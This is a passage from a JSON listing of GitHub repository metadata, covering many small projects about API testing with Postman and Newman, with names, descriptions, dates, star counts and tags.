collections","moedelo"]},{"user":"dgparker","repo":"vegeta-powerup","pulled":"User","id":193436497,"name":"vegeta-powerup","full_name":"dgparker/vegeta-powerup","description":"Charge up Vegeta load tests using postman","fork":false,"created_at":"2019-06-24T04:58:58Z","updated_at":"2020-03-09T10:24:05Z","forks":1,"open_issues":0,"watchers":3,"network_count":1,"subscribers_count":0,"owner_id":23160638,"owner_login":"dgparker","owner_avatar_url":"https://avatars3.githubusercontent.com/u/23160638?v=4","owner_type":"User","tags":["test"," postman","tests","tests ","load"]},{"user":"rohitthapliyal2000","repo":"Flask","pulled":"User","id":126069597,"name":"Flask","full_name":"rohitthapliyal2000/Flask","description":"Simple web APIs, tested using POSTMAN and built using Flask, a Python web framework","fork":false,"created_at":"2018-03-20T19:11:05Z","updated_at":"2018-08-11T13:59:45Z","forks":1,"open_issues":0,"watchers":10,"network_count":1,"subscribers_count":1,"owner_id":15167953,"owner_login":"rohitthapliyal2000","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15167953?v=4","owner_type":"User","tags":["test","tested","framework","built"]},{"user":"LinYangxin","repo":"postman-ultimate","pulled":"User","id":79989875,"name":"postman-ultimate","full_name":"LinYangxin/postman-ultimate","description":null,"fork":false,"created_at":"2017-01-25T06:40:28Z","updated_at":"2019-04-20T11:12:47Z","forks":0,"open_issues":0,"watchers":2,"network_count":0,"subscribers_count":1,"owner_id":25339219,"owner_login":"LinYangxin","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25339219?v=4","owner_type":"User","tags":[]},{"user":"damcfarl","repo":"ATX-Postman","pulled":"User","id":200718610,"name":"ATX-Postman","full_name":"damcfarl/ATX-Postman","description":null,"fork":false,"created_at":"2019-08-05T19:45:22Z","updated_at":"2020-02-24T12:31:33Z","forks":0,"open_issues":0,"watchers":2,"network_count":0,"subscribers_count":1,"owner_id":22107424,"owner_login":"damcfarl","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22107424?v=4","owner_type":"User","tags":[]},{"user":"hasimy-as","repo":"NodePostman","pulled":"User","id":204016424,"name":"NodePostman","full_name":"hasimy-as/NodePostman","description":"A Node.js application, used to test Node.js back-end service with Postman.","fork":false,"created_at":"2019-08-23T14:41:06Z","updated_at":"2019-11-05T06:01:31Z","forks":0,"open_issues":0,"watchers":2,"network_count":0,"subscribers_count":1,"owner_id":51184185,"owner_login":"hasimy-as","owner_avatar_url":"https://avatars1.githubusercontent.com/u/51184185?v=4","owner_type":"User","tags":["test","application","service"]},{"user":"xyyxhcj","repo":"vpi","pulled":"User","id":228555627,"name":"vpi","full_name":"xyyxhcj/vpi","description":"接口管理系统（支持JSON导入，引用数据结构，接口测试） api management with json import, reference data structure, test","fork":false,"created_at":"2019-12-17T07:11:46Z","updated_at":"2020-03-26T13:38:45Z","forks":6,"open_issues":0,"watchers":12,"network_count":6,"subscribers_count":4,"owner_id":27875017,"owner_login":"xyyxhcj","owner_avatar_url":"https://avatars0.githubusercontent.com/u/27875017?v=4","owner_type":"User","tags":["test","data","json","manage","import","struct","management","structure","reference"]},{"user":"masciugo","repo":"postman-newman-example","pulled":"User","id":112596598,"name":"postman-newman-example","full_name":"masciugo/postman-newman-example","description":"example setup to test API with with Postman newman","fork":false,"created_at":"2017-11-30T10:11:03Z","updated_at":"2019-12-22T13:49:16Z","forks":0,"open_issues":0,"watchers":2,"network_count":0,"subscribers_count":0,"owner_id":454321,"owner_login":"masciugo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/454321?v=4","owner_type":"User","tags":["test","example","newman","setup"]},{"user":"vdespa","repo":"postman-testing-file-uploads","pulled":"User","id":117801309,"name":"postman-testing-file-uploads","full_name":"vdespa/postman-testing-file-uploads","description":"A sample postman collection showing how you can tests ","fork":false,"created_at":"2018-01-17T07:32:18Z","updated_at":"2019-07-16T03:28:26Z","forks":2,"open_issues":0,"watchers":2,"network_count":2,"subscribers_count":0,"owner_id":1197635,"owner_login":"vdespa","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1197635?v=4","owner_type":"User","tags":["test"," postman","collect","collection","postman collection","tests","tests ","sample","showing"]},{"user":"gauravsinghrawat","repo":"postmanClone","pulled":"User","id":223626730,"name":"postmanClone","full_name":"gauravsinghrawat/postmanClone","description":"This the demo working clone of Post man API to make different type of requests to test our server API.","fork":false,"created_at":"2019-11-23T17:23:12Z","updated_at":"2019-12-02T11:55:37Z","forks":0,"open_issues":0,"watchers":0,"network_count":0,"subscribers_count":1,"owner_id":48629593,"owner_login":"gauravsinghrawat","owner_avatar_url":"https://avatars3.githubusercontent.com/u/48629593?v=4","owner_type":"User","tags":["test","request","server","requests","demo","rent","working","type","clone"]},{"id":165998464,"name":"PostmanDemo","full_name":"danielplawgo/PostmanDemo","description":null,"fork":false,"created_at":"2019-01-16T07:55:35Z","updated_at":"2019-12-11T10:15:17Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":70243,"owner_login":"danielplawgo","owner_avatar_url":"https://avatars0.githubusercontent.com/u/70243?v=4","pulled":1,"tags":[]},{"user":"saikiran40cs","repo":"PostmanSample","pulled":"User","id":245851930,"name":"PostmanSample","full_name":"saikiran40cs/PostmanSample","description":"This is to test postman sample tests","fork":false,"created_at":"2020-03-08T16:50:42Z","updated_at":"2020-03-08T16:53:23Z","forks":0,"open_issues":0,"watchers":0,"network_count":0,"subscribers_count":1,"owner_id":6228048,"owner_login":"saikiran40cs","owner_avatar_url":"https://avatars1.githubusercontent.com/u/6228048?v=4","owner_type":"User","tags":["test"," postman","tests","sample"]},{"id":182854150,"name":"gopherman","full_name":"cohix/gopherman","description":"Utility library for creating and running tests using the Postman collection format","fork":false,"created_at":"2019-04-22T19:28:50Z","updated_at":"2019-09-03T10:36:54Z","stargazers_count":4,"watchers_count":4,"forks":3,"watchers":4,"score":1,"owner_id":5942370,"owner_login":"cohix","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5942370?v=4","tags":["test","collect","collection","form","tests","tests ","format","running","library","creating"]},{"id":124871209,"name":"newman-circleci","full_name":"Thirumurugan19/newman-circleci","description":"Integrate API tests with Postman, Newman, and CircleCI","fork":false,"created_at":"2018-03-12T10:19:17Z","updated_at":"2019-12-28T08:46:24Z","stargazers_count":3,"watchers_count":3,"forks":3,"watchers":3,"score":1,"owner_id":3726770,"owner_login":"Thirumurugan19","owner_avatar_url":"https://avatars0.githubusercontent.com/u/3726770?v=4","tags":["test","tests","tests "]},{"id":108252632,"name":"super-powered-api-testing","full_name":"JamesMessinger/super-powered-api-testing","description":"Comparisons of powerful API testing tools","fork":false,"created_at":"2017-10-25T10:04:57Z","updated_at":"2019-11-05T05:43:24Z","stargazers_count":19,"watchers_count":19,"forks":19,"watchers":19,"score":1,"owner_id":3453903,"owner_login":"JamesMessinger","owner_avatar_url":"https://avatars3.githubusercontent.com/u/3453903?v=4","pulled":1,"tags":["test","testing","tool","tools","powerful"]},{"id":91162919,"name":"ApiDebug","full_name":"EhsanTang/ApiDebug","description":"浏览器API接口调试插件，Chrome接口调试工具，http调试，post调试，post模拟工具，postman，post接口调试，post测试插件-ApiDebug is a browser plug-in for testing RESTful web services. http://api.crap.cn","fork":false,"created_at":"2017-05-13T09:18:26Z","updated_at":"2020-03-24T09:58:07Z","stargazers_count":115,"watchers_count":115,"forks":36,"watchers":115,"score":1,"owner_id":5117567,"owner_login":"EhsanTang","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5117567?v=4","pulled":1,"tags":["test","testing","service","http","services","browser"]},{"id":175819935,"name":"EhrStore.Postman","full_name":"DIPSAS/EhrStore.Postman","description":"Some postman scripts to test and verify the features of an openEHR server ","fork":false,"created_at":"2019-03-15T12:54:01Z","updated_at":"2020-02-14T09:06:48Z","stargazers_count":5,"watchers_count":5,"forks":1,"watchers":5,"score":1,"owner_id":10976610,"owner_login":"DIPSAS","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10976610?v=4","tags":["test"," postman","script","server","scripts","open","feature","features","postman scripts","verify"]},{"id":60532197,"name":"yaoyi-postman-express-json","full_name":"YKKKY/yaoyi-postman-express-json","description":null,"fork":false,"created_at":"2016-06-06T13:57:28Z","updated_at":"2016-06-26T10:17:59Z","stargazers_count":0,"watchers_count":0,"forks":2,"watchers":0,"score":1,"owner_id":18323447,"owner_login":"YKKKY","owner_avatar_url":"https://avatars1.githubusercontent.com/u/18323447?v=4","pulled":1,"tags":[]},{"id":210318026,"name":"REST-API-testing","full_name":"andreasmmadjiah/REST-API-testing","description":"Simple API testing using pythonanywhere and postman","fork":false,"created_at":"2019-09-23T09:39:40Z","updated_at":"2019-09-23T16:24:51Z","stargazers_count":5,"watchers_count":5,"forks":0,"watchers":5,"score":1,"owner_id":54434214,"owner_login":"andreasmmadjiah","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54434214?v=4","tags":["test"," postman","testing","python","pythonanywhere"]},{"id":145468787,"name":"Postman-AutoTestAPI","full_name":"Software-On-The-Road/Postman-AutoTestAPI","description":"Generate simple unit tests from JSONs for Postman collections","fork":false,"created_at":"2018-08-20T20:45:42Z","updated_at":"2020-01-22T16:49:38Z","stargazers_count":4,"watchers_count":4,"forks":0,"watchers":4,"score":1,"owner_id":56113610,"owner_login":"Software-On-The-Road","owner_avatar_url":"https://avatars2.githubusercontent.com/u/56113610?v=4","tags":["test","collect","collection","collections","tests","tests ","unit"]},{"id":143961697,"name":"mapbox-postman-collections","full_name":"umer-ali-khan/mapbox-postman-collections","description":null,"fork":false,"created_at":"2018-08-08T04:38:45Z","updated_at":"2020-02-19T21:51:02Z","stargazers_count":4,"watchers_count":4,"forks":1,"watchers":4,"score":1,"owner_id":7586760,"owner_login":"umer-ali-khan","owner_avatar_url":"https://avatars0.githubusercontent.com/u/7586760?v=4","tags":[]},{"id":99351387,"name":"microcks-postman-runtime","full_name":"microcks/microcks-postman-runtime","description":"A bridge for running Postman tests from HTTP interface","fork":false,"created_at":"2017-08-04T14:34:30Z","updated_at":"2019-03-04T17:10:54Z","stargazers_count":4,"watchers_count":4,"forks":0,"watchers":4,"score":1,"owner_id":11051048,"owner_login":"microcks","owner_avatar_url":"https://avatars1.githubusercontent.com/u/11051048?v=4","pulled":1,"tags":["test","tests","tests ","running","face","interface","bridge"]},{"id":124471558,"name":"api-manager","full_name":"easy-ware/api-manager","description":"Help front-end and back-end devolopers to work with APIs faster and easier. features: API define, mock, test, document. like postman, rap.  API接口管理平台，支持接口实际和mock测试","fork":false,"created_at":"2018-03-09T01:45:49Z","updated_at":"2019-12-29T08:50:31Z","stargazers_count":15,"watchers_count":15,"forks":7,"watchers":15,"score":1,"owner_id":35788760,"owner_login":"easy-ware","owner_avatar_url":"https://avatars1.githubusercontent.com/u/35788760?v=4","tags":["test"," postman","document","front","mock","feature","features","easier","define","devolopers"]},{"id":103703006,"name":"Postman-Google-Analytics-Report","full_name":"66eli77/Postman-Google-Analytics-Report","description":null,"fork":false,"created_at":"2017-09-15T21:29:58Z","updated_at":"2019-12-04T09:12:35Z","stargazers_count":4,"watchers_count":4,"forks":2,"watchers":4,"score":1,"owner_id":5577205,"owner_login":"66eli77","owner_avatar_url":"https://avatars0.githubusercontent.com/u/5577205?v=4","tags":[]},{"id":30686163,"name":"hapi-postman","full_name":"TheEvilDev/hapi-postman","description":"Hapi plugin that exposes endpoint meta data as a postman collection for easy testing.","fork":false,"created_at":"2015-02-12T04:48:54Z","updated_at":"2019-01-28T18:16:35Z","stargazers_count":3,"watchers_count":3,"forks":1,"watchers":3,"score":1,"owner_id":689065,"owner_login":"TheEvilDev","owner_avatar_url":"https://avatars2.githubusercontent.com/u/689065?v=4","pulled":1,"tags":["test"," postman","collect","collection","data","testing","postman collection","endpoint","plugin","expose","exposes"]},{"id":186474764,"name":"postman-paths","full_name":"paigemoody/postman-paths","description":"Shortest path web app for community organizers. Live at: http://www.weavewalk.me","fork":false,"created_at":"2019-05-13T18:30:55Z","updated_at":"2019-09-04T17:46:54Z","stargazers_count":3,"watchers_count":3,"forks":0,"watchers":3,"score":1,"owner_id":25571355,"owner_login":"paigemoody","owner_avatar_url":"https://avatars0.githubusercontent.com/u/25571355?v=4","tags":["test","http","web app","unit","path","unity"]},{"id":90326003,"name":"consul-postman","full_name":"johnlonganecker/consul-postman","description":null,"fork":false,"created_at":"2017-05-05T01:46:07Z","updated_at":"2017-09-19T15:21:14Z","stargazers_count":3,"watchers_count":3,"forks":1,"watchers":3,"score":1,"owner_id":587052,"owner_login":"johnlonganecker","owner_avatar_url":"https://avatars1.githubusercontent.com/u/587052?v=4","tags":[]},{"id":161397888,"name":"Postman-Testing","full_name":"tutagomes/Postman-Testing","description":"A repository to store some data and testing scripts used by my tutorial about postman testing.","fork":false,"created_at":"2018-12-11T21:47:16Z","updated_at":"2020-03-24T22:53:24Z","stargazers_count":3,"watchers_count":3,"forks":1,"watchers":3,"score":1,"owner_id":7077493,"owner_login":"tutagomes","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7077493?v=4","pulled":1,"tags":["test"," postman","repo","data","testing","repos","repository","script","scripts","store","tutorial"]},{"id":209098019,"name":"pman","full_name":"SalahEddin/pman","description":"package to create postman test collections without Postman GUI","fork":false,"created_at":"2019-09-17T16:02:04Z","updated_at":"2019-09-18T15:53:10Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":7818090,"owner_login":"SalahEddin","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7818090?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","create","package"]},{"id":60530352,"name":"YangHuiLi-express-json-postman","full_name":"Alloy-Girls/YangHuiLi-express-json-postman","description":null,"fork":false,"created_at":"2016-06-06T13:32:35Z","updated_at":"2016-06-06T13:41:39Z","stargazers_count":0,"watchers_count":0,"forks":2,"watchers":0,"score":1,"owner_id":19777946,"owner_login":"Alloy-Girls","owner_avatar_url":"https://avatars2.githubusercontent.com/u/19777946?v=4","pulled":1,"tags":[]},{"id":148662512,"name":"rest-api-postman","full_name":"Earthport/rest-api-postman","description":"This repository contains Postman collections to help Earthport clients test their integration into Earthport's APIs","fork":false,"created_at":"2018-09-13T15:56:25Z","updated_at":"2019-10-16T12:55:10Z","stargazers_count":3,"watchers_count":3,"forks":0,"watchers":3,"score":1,"owner_id":40466066,"owner_login":"Earthport","owner_avatar_url":"https://avatars1.githubusercontent.com/u/40466066?v=4","tags":["test","collect","collection","collections","repo","repos","repository","client","contain","help","integration","clients"]},{"id":178227430,"name":"ezplatform_rest_api_postman","full_name":"arfaram/ezplatform_rest_api_postman","description":null,"fork":false,"created_at":"2019-03-28T15:05:49Z","updated_at":"2020-01-26T10:22:54Z","stargazers_count":3,"watchers_count":3,"forks":0,"watchers":3,"score":1,"owner_id":793247,"owner_login":"arfaram","owner_avatar_url":"https://avatars1.githubusercontent.com/u/793247?v=4","tags":[]},{"id":73704980,"name":"autotests","full_name":"evmon/autotests","description":"Autotest for Postman collections","fork":false,"created_at":"2016-11-14T13:01:17Z","updated_at":"2019-11-14T12:04:11Z","stargazers_count":2,"watchers_count":2,"forks":1,"watchers":2,"score":1,"owner_id":20344313,"owner_login":"evmon","owner_avatar_url":"https://avatars2.githubusercontent.com/u/20344313?v=4","tags":["test","collect","collection","collections"]},{"id":66082112,"name":"api-examples","full_name":"moedelo/api-examples","description":"test postman collections for moedelo api","fork":false,"created_at":"2016-08-19T12:51:56Z","updated_at":"2018-02-06T21:14:31Z","stargazers_count":3,"watchers_count":3,"forks":0,"watchers":3,"score":1,"owner_id":10271089,"owner_login":"moedelo","owner_avatar_url":"https://avatars1.githubusercontent.com/u/10271089?v=4","tags":["test"," postman","collect","collection","collections","postman collection","postman collections","moedelo"]},{"id":193436497,"name":"vegeta-powerup","full_name":"dgparker/vegeta-powerup","description":"Charge up Vegeta load tests using postman","fork":false,"created_at":"2019-06-24T04:58:58Z","updated_at":"2020-03-09T10:24:05Z","stargazers_count":3,"watchers_count":3,"forks":1,"watchers":3,"score":1,"owner_id":23160638,"owner_login":"dgparker","owner_avatar_url":"https://avatars3.githubusercontent.com/u/23160638?v=4","tags":["test"," postman","tests","tests ","load"]},{"id":228555627,"name":"vpi","full_name":"xyyxhcj/vpi","description":"接口管理系统（支持JSON导入，引用数据结构，接口测试） api management with json import, reference data structure, test","fork":false,"created_at":"2019-12-17T07:11:46Z","updated_at":"2020-03-19T09:59:14Z","stargazers_count":12,"watchers_count":12,"forks":6,"watchers":12,"score":1,"owner_id":27875017,"owner_login":"xyyxhcj","owner_avatar_url":"https://avatars0.githubusercontent.com/u/27875017?v=4","tags":["test","data","json","manage","import","struct","management","structure","reference"]},{"id":94365686,"name":"postman-audit","full_name":"tylrd/postman-audit","description":null,"fork":false,"created_at":"2017-06-14T19:25:28Z","updated_at":"2017-11-08T21:12:33Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":9401828,"owner_login":"tylrd","owner_avatar_url":"https://avatars3.githubusercontent.com/u/9401828?v=4","tags":[]},{"id":126069597,"name":"Flask","full_name":"rohitthapliyal2000/Flask","description":"Simple web APIs, tested using POSTMAN and built using Flask, a Python web framework","fork":false,"created_at":"2018-03-20T19:11:05Z","updated_at":"2018-08-11T13:59:45Z","stargazers_count":10,"watchers_count":10,"forks":1,"watchers":10,"score":1,"owner_id":15167953,"owner_login":"rohitthapliyal2000","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15167953?v=4","tags":["test","tested","framework","built"]},{"id":204016424,"name":"NodePostman","full_name":"hasimy-as/NodePostman","description":"A Node.js application, used to test Node.js back-end service with Postman.","fork":false,"created_at":"2019-08-23T14:41:06Z","updated_at":"2019-11-05T06:01:31Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":51184185,"owner_login":"hasimy-as","owner_avatar_url":"https://avatars1.githubusercontent.com/u/51184185?v=4","pulled":1,"tags":["test","application","service"]},{"id":112596598,"name":"postman-newman-example","full_name":"masciugo/postman-newman-example","description":"example setup to test API with with Postman newman","fork":false,"created_at":"2017-11-30T10:11:03Z","updated_at":"2019-12-22T13:49:16Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":454321,"owner_login":"masciugo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/454321?v=4","tags":["test","example","newman","setup"]},{"id":154583789,"name":"postman","full_name":"comecero/postman","description":"Postman collections for API testing","fork":false,"created_at":"2018-10-24T23:48:31Z","updated_at":"2019-08-22T15:19:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21204916,"owner_login":"comecero","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21204916?v=4","tags":["test","collect","collection","collections","testing"]},{"id":212571116,"name":"postman","full_name":"JudeAshly/postman","description":"test","fork":false,"created_at":"2019-10-03T12:11:40Z","updated_at":"2019-10-03T13:18:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26906351,"owner_login":"JudeAshly","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26906351?v=4","tags":["test"]},{"id":213861538,"name":"postman","full_name":"Tempesto/postman","description":null,"fork":false,"created_at":"2019-10-09T08:22:03Z","updated_at":"2019-10-09T08:31:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37709632,"owner_login":"Tempesto","owner_avatar_url":"https://avatars1.githubusercontent.com/u/37709632?v=4","tags":[]},{"id":214409860,"name":"POSTMAN","full_name":"Mayank6888/POSTMAN","description":null,"fork":false,"created_at":"2019-10-11T10:37:25Z","updated_at":"2019-10-11T10:37:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55777812,"owner_login":"Mayank6888","owner_avatar_url":"https://avatars1.githubusercontent.com/u/55777812?v=4","tags":[]},{"id":212217586,"name":"postman","full_name":"abdielantonioxd/postman","description":null,"fork":false,"created_at":"2019-10-01T23:22:11Z","updated_at":"2019-10-08T16:35:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26697864,"owner_login":"abdielantonioxd","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26697864?v=4","pulled":1,"tags":[]},{"id":218235300,"name":"postman","full_name":"AlyaSelviaTamzila/postman","description":null,"fork":false,"created_at":"2019-10-29T08:10:32Z","updated_at":"2019-10-29T08:11:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42310789,"owner_login":"AlyaSelviaTamzila","owner_avatar_url":"https://avatars0.githubusercontent.com/u/42310789?v=4","pulled":1,"tags":[]},{"id":230391208,"name":"postman","full_name":"msapna717/postman","description":null,"fork":false,"created_at":"2019-12-27T07:01:45Z","updated_at":"2019-12-27T09:06:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46435843,"owner_login":"msapna717","owner_avatar_url":"https://avatars2.githubusercontent.com/u/46435843?v=4","tags":[]},{"id":231014692,"name":"Postman","full_name":"fmgarcia/Postman","description":null,"fork":false,"created_at":"2019-12-31T02:54:10Z","updated_at":"2019-12-31T02:56:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4910023,"owner_login":"fmgarcia","owner_avatar_url":"https://avatars3.githubusercontent.com/u/4910023?v=4","tags":[]},{"id":223934421,"name":"Postman","full_name":"imvsinha/Postman","description":null,"fork":false,"created_at":"2019-11-25T11:38:58Z","updated_at":"2019-11-25T11:38:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43820888,"owner_login":"imvsinha","owner_avatar_url":"https://avatars3.githubusercontent.com/u/43820888?v=4","tags":[]},{"id":225184263,"name":"postman","full_name":"mbykovcom/postman","description":null,"fork":false,"created_at":"2019-12-01T15:32:52Z","updated_at":"2019-12-01T15:35:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32464530,"owner_login":"mbykovcom","owner_avatar_url":"https://avatars2.githubusercontent.com/u/32464530?v=4","tags":[]},{"id":179355538,"name":"postman","full_name":"intrigue0707/postman","description":"autotestpostman","fork":false,"created_at":"2019-04-03T19:22:30Z","updated_at":"2019-04-03T21:00:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15210627,"owner_login":"intrigue0707","owner_avatar_url":"https://avatars2.githubusercontent.com/u/15210627?v=4","tags":["test","auto","autotestpostman","autotest"]},{"id":181788976,"name":"postman","full_name":"flyingmozi/postman","description":"test new day","fork":false,"created_at":"2019-04-17T00:42:39Z","updated_at":"2019-04-17T01:20:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49477067,"owner_login":"flyingmozi","owner_avatar_url":"https://avatars1.githubusercontent.com/u/49477067?v=4","pulled":1,"tags":["test"]},{"id":117801309,"name":"postman-testing-file-uploads","full_name":"vdespa/postman-testing-file-uploads","description":"A sample postman collection showing how you can tests ","fork":false,"created_at":"2018-01-17T07:32:18Z","updated_at":"2019-07-16T03:28:26Z","stargazers_count":2,"watchers_count":2,"forks":2,"watchers":2,"score":1,"owner_id":1197635,"owner_login":"vdespa","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1197635?v=4","tags":["test"," postman","collect","collection","postman collection","tests","tests ","sample","showing"]},{"id":106688072,"name":"postman","full_name":"abhishektappp/postman","description":"testing endpoints","fork":false,"created_at":"2017-10-12T12:11:33Z","updated_at":"2017-10-12T12:11:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32737557,"owner_login":"abhishektappp","owner_avatar_url":"https://avatars0.githubusercontent.com/u/32737557?v=4","tags":["test","testing","endpoint","points","endpoints"]},{"id":81798458,"name":"postman","full_name":"PoeticSubterfuge/postman","description":null,"fork":false,"created_at":"2017-02-13T07:45:06Z","updated_at":"2017-02-13T07:45:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22222313,"owner_login":"PoeticSubterfuge","owner_avatar_url":"https://avatars0.githubusercontent.com/u/22222313?v=4","tags":[]},{"id":158180107,"name":"postman","full_name":"lamabc/postman","description":"postman tests","fork":false,"created_at":"2018-11-19T07:33:21Z","updated_at":"2018-11-19T07:38:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25346088,"owner_login":"lamabc","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25346088?v=4","tags":["test","tests","postman tests"]},{"id":148975513,"name":"postman","full_name":"abbzxcvbnm12345/postman","description":null,"fork":false,"created_at":"2018-09-16T08:02:53Z","updated_at":"2018-09-16T08:02:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43104886,"owner_login":"abbzxcvbnm12345","owner_avatar_url":"https://avatars0.githubusercontent.com/u/43104886?v=4","tags":[]},{"id":96555870,"name":"TIY-week7-day5-project","full_name":"zachmorse/TIY-week7-day5-project","description":"create an API for testing via Postman. Should send JSON directly from the database to postman via routes","fork":false,"created_at":"2017-07-07T16:18:07Z","updated_at":"2017-07-07T16:34:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23346917,"owner_login":"zachmorse","owner_avatar_url":"https://avatars0.githubusercontent.com/u/23346917?v=4","pulled":1,"tags":["test"," postman","create","data","testing","database","route","send","routes","directly"]},{"id":80372834,"name":"bound-ttr","full_name":"Xantier/bound-ttr","description":"Automated boundary testing framework based on Postman collections and database assertions","fork":false,"created_at":"2017-01-29T21:10:28Z","updated_at":"2019-03-01T04:27:26Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":2392775,"owner_login":"Xantier","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2392775?v=4","pulled":1,"tags":["test","collect","collection","collections","data","testing","database","based","framework","assert","assertion","boundary"]},{"id":191826195,"name":"REST-API---status-codes","full_name":"kristaeis/REST-API---status-codes","description":"REST API featuring status codes and Postman tests/environment","fork":false,"created_at":"2019-06-13T20:06:59Z","updated_at":"2019-06-13T20:14:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28417063,"owner_login":"kristaeis","owner_avatar_url":"https://avatars3.githubusercontent.com/u/28417063?v=4","pulled":1,"tags":["test","tests","code","environment","stat","status","codes","featuring"]},{"id":104141043,"name":"CriacaoAPI","full_name":"fsardim/CriacaoAPI","description":"Criação de APIs REST com Postman para testes","fork":false,"created_at":"2017-09-19T23:38:35Z","updated_at":"2017-09-19T23:45:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28940065,"owner_login":"fsardim","owner_avatar_url":"https://avatars1.githubusercontent.com/u/28940065?v=4","pulled":1,"tags":["test","testes"]},{"id":97756745,"name":"mean-test1","full_name":"vpapazov/mean-test1","description":"testing request/update of the data through postman. ","fork":false,"created_at":"2017-07-19T20:08:24Z","updated_at":"2017-07-19T20:10:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11355230,"owner_login":"vpapazov","owner_avatar_url":"https://avatars0.githubusercontent.com/u/11355230?v=4","pulled":1,"tags":["test"," postman","data","testing","request","update"]},{"id":237809510,"name":"httpServerProj","full_name":"ZhiroMusikyan/httpServerProj","description":" Creating test server for handling Requests and Responses via Postman","fork":false,"created_at":"2020-02-02T17:38:01Z","updated_at":"2020-02-02T20:53:16Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":40068920,"owner_login":"ZhiroMusikyan","owner_avatar_url":"https://avatars0.githubusercontent.com/u/40068920?v=4","pulled":1,"tags":["test","server","handling"]},{"id":235767044,"name":"newman-parallel-test","full_name":"h4n2k/newman-parallel-test","description":"Simple parallel test which run multiple postman collection in parallel ","fork":false,"created_at":"2020-01-23T09:58:22Z","updated_at":"2020-01-24T08:50:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1946379,"owner_login":"h4n2k","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1946379?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection","multiple","parallel"]},{"id":183538639,"name":"AF_Group_Project","full_name":"dilanSuraj/AF_Group_Project","description":"Currently this contains Backend of the project tested using POSTMAN","fork":false,"created_at":"2019-04-26T01:59:29Z","updated_at":"2019-07-16T05:53:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40181843,"owner_login":"dilanSuraj","owner_avatar_url":"https://avatars2.githubusercontent.com/u/40181843?v=4","pulled":1,"tags":["test","contain","tested","rent"]},{"id":153952610,"name":"RESTy","full_name":"Kevinoh47/RESTy","description":"react.js application for testing REST APIs, similar to Postman","fork":false,"created_at":"2018-10-20T22:08:34Z","updated_at":"2019-10-10T21:41:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3741082,"owner_login":"Kevinoh47","owner_avatar_url":"https://avatars0.githubusercontent.com/u/3741082?v=4","pulled":1,"tags":["test","testing","application","react"]},{"id":185269926,"name":"Shopping-Cart","full_name":"carolinewojtach/Shopping-Cart","description":"REST API made with Node.js & Express tested on Postman","fork":false,"created_at":"2019-05-06T20:50:29Z","updated_at":"2019-06-17T17:24:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44320252,"owner_login":"carolinewojtach","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44320252?v=4","pulled":1,"tags":["test","tested"]},{"id":145627376,"name":"vscode-apiclient","full_name":"dayemsiddiqui/vscode-apiclient","description":"Postman like vscode extension for testing APIs within 